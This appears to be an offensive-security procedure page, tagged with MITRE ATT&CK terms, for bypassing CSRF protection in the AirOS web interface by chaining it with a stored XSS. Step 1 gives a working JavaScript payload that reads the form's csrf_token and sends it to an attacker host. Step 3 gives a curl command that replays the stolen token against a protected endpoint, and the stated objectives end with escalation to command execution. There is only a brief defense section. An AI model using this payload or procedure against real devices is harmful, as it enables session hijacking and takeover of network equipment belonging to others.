---
tags:
  - csrf-bypass
  - xss
  - token-theft
  - airos
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
  - Embedded Device
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:27:35.833Z'
sub_techniques: []
id: 68ed62cc-1ca3-4d4f-ae70-1e9891b46000
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Bypass-CSRF-Tokens-Using-Stored-XSS

## Summary

This procedure utilizes an injected stored XSS payload to read and forge CSRF tokens, completely bypassing protections for authenticated actions in the AirOS web interface.

## Description

The XSS executes within the same-origin policy of the device UI, allowing access to hidden token fields. Attackers can exfiltrate tokens or automate request forging, enabling unrestricted access to sensitive endpoints. Applicable to AirOS 6.1.5+ where XSS is chained from prior steps.

## Requirements

1. Stored XSS already injected
2. Access to pages with CSRF-protected forms
3. Attacker server for token exfiltration

## Defense

Defensive measures and detection strategies:

- Bind CSRF tokens to user sessions and validate strictly
- Implement SameSite cookies and monitor for XSS indicators
- Log and alert on unusual token usage patterns

## Objectives

1. Extract valid CSRF tokens from forms
2. Forge requests to protected endpoints
3. Escalate to command execution

## Instructions

### Step 1: Enhance XSS Payload

**Context**: Update the stored payload to target token elements.

Payload example: `<script>var token = document.getElementsByName('csrf_token')[0].value; new Image().src='http://attacker.com/log?token='+encodeURIComponent(token);</script>`

### Step 2: Trigger Payload Execution

**Context**: Ensure admin views the injected config page to run the script.

Monitor attacker server for incoming token data.

### Step 3: Use Stolen Token

**Context**: Replay the token in forged requests to bypass validation.

Example forged request (via curl or form):

```bash
curl -X POST http://target-device-ip/protected-endpoint -d "csrf_token=STOLEN_TOKEN&action=modify"
```

> Success if request processes without errors.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[JavaScript]] JavaScript

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf-bypass]]
- [[xss]]
- [[token-theft]]
